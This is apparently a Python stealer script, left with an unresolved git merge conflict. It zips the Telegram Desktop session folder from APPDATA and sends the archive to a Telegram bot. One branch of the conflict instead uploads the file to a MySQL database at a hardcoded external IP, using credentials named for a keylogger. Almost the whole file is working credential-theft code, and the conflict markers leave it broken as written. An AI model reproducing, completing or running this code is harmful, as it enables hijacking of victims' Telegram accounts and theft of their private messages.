import zipfile
import os
import shutil
import requests
from dotenv import load_dotenv
from aiogram import Bot
from aiogram.types import FSInputFile

load_dotenv()

def zip_folder(folder_path, output_path):
    with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, _, files in os.walk(folder_path):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, folder_path)
                zipf.write(file_path, arcname)

async def send_test_message(bot_token, chat_id):
    bot = Bot(token=bot_token)
    async with bot:
        await bot.send_message(chat_id, "Тестовое сообщение.")

<<<<<<< HEAD
async def send_file_to_user(file_path, bot_token, chat_id):
    bot = Bot(token=bot_token)
    async with bot:
        input_file = FSInputFile(file_path)
        await bot.send_document(chat_id, document=input_file)
=======
def save_file_to_db(file_path):
    connection = pymysql.connect(
        host='38.180.219.103',
        port=3306,
        user='user',
        password='Keylogger2024+',
        database='logger_db'
    )
    cursor = connection.cursor()
    with open(file_path, 'rb') as f:
        binary_data = f.read()
    cursor.execute("INSERT INTO users_data (file) VALUES (%s)", (binary_data,))
    connection.commit()
    cursor.close()
    connection.close()
>>>>>>> 3c4de78d2f9706f56da0f793ada07f02b384e939

# Определяем переменные
folder_to_zip = os.path.join(os.getenv('APPDATA'), r'Telegram Desktop\tdata')
temp_folder = os.path.join(os.path.expanduser('~'), 'Desktop', 'tdata_temp')
output_zip = os.path.join(os.path.expanduser('~'), 'Desktop', 'tdata_backup.zip')
bot_token = os.getenv('BOT_TOKEN')
chat_id = os.getenv('CHAT_ID')

# Добавьте отладочные принты
print(f'BOT_TOKEN: {bot_token}')
print(f'CHAT_ID: {chat_id}')

# Копируем папку, если доступ запрещен
if os.path.exists(folder_to_zip):
    try:
        if os.path.exists(temp_folder):
            shutil.rmtree(temp_folder)  # Удаляем временную папку, если она существует
        shutil.copytree(folder_to_zip, temp_folder)
        zip_folder(temp_folder, output_zip)
        shutil.rmtree(temp_folder)  # Удаляем временную папку
        print(f'Папка "{folder_to_zip}" успешно скопирована и сжата в "{output_zip}".')

        # Отправляем тестовое сообщение для проверки
        import asyncio
        asyncio.run(send_test_message(bot_token, chat_id))
        print('Тестовое сообщение отправлено.')

        # Отправляем файл пользователю через Telegram API
        asyncio.run(send_file_to_user(output_zip, bot_token, chat_id))
        print('Файл успешно отправлен пользователю.')
    except PermissionError as e:
        print(f'Ошибка доступа: {e}')
    except Exception as e:
        print(f'Произошла ошибка: {e}')
# ...